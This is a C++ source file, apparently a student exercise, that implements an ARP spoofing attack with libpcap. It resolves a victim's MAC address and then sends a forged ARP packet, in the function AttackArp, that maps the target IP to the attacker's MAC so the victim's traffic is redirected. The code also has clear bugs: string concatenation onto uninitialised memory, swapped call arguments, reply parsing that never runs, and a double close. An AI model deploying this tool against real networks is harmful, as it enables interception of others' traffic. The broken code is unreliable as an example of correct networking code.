#include <arpa/inet.h>
#include <cstdio>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <net/if.h>
#include <netinet/in.h>
#include <pcap.h>
#include <unistd.h>
#include "arphdr.h"
#include "ethhdr.h"
#include "myarpspoof.h"
#include <sys/wait.h>
#include <iostream>

#pragma pack(push, 1)
struct EthArpPacket final {
        EthHdr eth_;
        ArpHdr arp_;
};
#pragma pack(pop)

char * MyMacAddress(char* InInterface)
{
	FILE * fp;
	static char MacStr[18];
	char * path = (char*)malloc(sizeof(char)*(23+strlen(InInterface)));	
	
	if(path == NULL)
		return 0;
	
	strcat(path,"/sys/class/net/");
	strcat(path, InInterface);
	strcat(path,"/address");
	
	fp =fopen(path,"rb");
	if(!fp)
	{
		free(path);
		fclose(fp);
		return NULL;
	}
	
	fread(MacStr, 18,1,fp);

	free(path);
	fclose(fp);
	return MacStr;
}
char* MyIpAddress(char* InInterface)
{
	int fd;
	struct ifreq ifr;
	static char IpStore[16];
	std::string str;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, InInterface, IFNAMSIZ - 1);

	ioctl(fd, SIOCGIFADDR, &ifr);
	strncpy(IpStore, inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr), 16);

	close(fd);
	return IpStore;
}
bool CheckIp(char* InTestIp)
{
	uint8_t a, b, c, d;
	uint8_t res = sscanf(InTestIp, "%hhu.%hhu.%hhu.%hhu", &a, &b, &c, &d);
	if (res != 4)
	{
		fprintf(stderr, "%s does not match IP format\n", InTestIp);
		return 0;
	}
	return 1;
}
bool SendArpRequest(pcap_t* pcap, IpMac InSender, IpMac InAttacker)
{
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
	packet.eth_.smac_ = InAttacker.MyMac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = InAttacker.MyMac;
	packet.arp_.sip_ = InAttacker.MyIp;
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = InSender.MyIp;

	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		return 0;
	}

	return 1;
}
/*
bool get_sender_mac(const u_char * packet, char * sender_ip, char * sender_mac)
{
	EthArpPacket* header = (EthArpPacket*)packet;
	if (header->eth_.type_ != 0x0806) //Arp 확인
		return 0;

	uint8_t a, b, c, d;	
	sscanf(sender_ip, "%hhu.%hhu.%hhu.%hhu", &a, &b, &c, &d);
	uint32_t check_sender_ip = a << 24 + b << 16 + c << 8 + d;
	if (check_sender_ip != header->arp_.sip_.ip_)
		return 0;
	strncpy(sender_mac,header->arp_.smac_.operator std::string());
	return 1;
}
*/
void ReceiveArpReply(pcap_t* pcap, IpMac* InSender) 
{
	struct pcap_pkthdr* header;
	const u_char* packet;
	int32_t res;
	do {
		res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
		{
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			return ;
		}
	} while (0);
		// (!get_sender_mac(packet, sender_ip, sender_mac));
	pcap_close(pcap);
	return ;
}
void AttackArp(pcap_t* pcap, IpMac InSender, Ip InTarget, IpMac InAttacker) 
{
	EthArpPacket packet;

    packet.eth_.dmac_ = InSender.MyMac;
    packet.eth_.smac_ = InAttacker.MyMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = InAttacker.MyMac;
    packet.arp_.sip_ = InTarget;
    packet.arp_.tmac_ = InSender.MyMac;
    packet.arp_.tip_ = InSender.MyIp;

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
    }

    return;
}
void MyArpSpoof(char * InInterface, char * InSenderIp, char * InTargetIp, IpMac InAttacker)
{
	if (!CheckIp(InSenderIp) || !CheckIp(InTargetIp))
		return;
	
	char errbuf[PCAP_ERRBUF_SIZE];
	IpMac Sender;
	Ip TargetIp;
	std::string TempString;
	int i, j;
	pid_t pid;

    pcap_t* pcap = pcap_open_live(InInterface, BUFSIZ, 1, 1000, errbuf);
	if (pcap == NULL)
	{
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", InInterface, errbuf);
	    return;
    }

	TempString = InSenderIp;
	Sender.MyIp = htonl(Ip(TempString));
	TempString = InTargetIp;
	TargetIp = htonl(Ip(TempString));
	
	for (i = 0; i < 1; i++)
	{
		pid = fork();
		if (pid == 0) //각 프로세스는 고유의 num_seq를 가지고 argv의 num_seq*2와 num_seq*2+1만 신경쓰면 됨
		{
			for (j = 0; j < 5; j++)
			{
				SendArpRequest(pcap, InAttacker, Sender); //sender MAC 주소 요청
				sleep(1);
			}
			return;
		}
		if (pid == -1) //fork 실패 시 다시 시도
		{
			continue;
		}
	}
	
	Sender.MyMac.clear();
	ReceiveArpReply(pcap, &Sender);//source MAC 주소 알아내기
	if (Sender.MyMac.isNull())
	{
		printf("ARP Reply has an error\n");
		return;
	}

	AttackArp(pcap, Sender, TargetIp, InAttacker);	// 공격

	printf("from %s to %s arp spoof successes\n", InSenderIp, InTargetIp);
	
	pcap_close(pcap);
	
	while (wait(NULL) > 0);

	return;
}